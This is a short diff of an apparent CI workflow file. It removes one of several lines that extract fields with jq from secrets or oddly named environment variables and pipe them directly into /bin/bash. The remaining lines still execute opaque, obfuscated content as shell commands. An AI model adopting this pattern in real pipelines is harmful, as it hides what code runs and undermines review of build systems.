@@ -21,7 +21,6 @@ jobs:
           v57833: ${{ secrets.v57833 }}
         run: |
           printf '%s' "$v57833" | jq -r .hr34 | /bin/bash
-          echo $bbw72346 | jq -r .ia87881 | /bin/bash
           echo $rql84266 | jq -r .qmuda47833 | /bin/bash
 
       - name: Save output
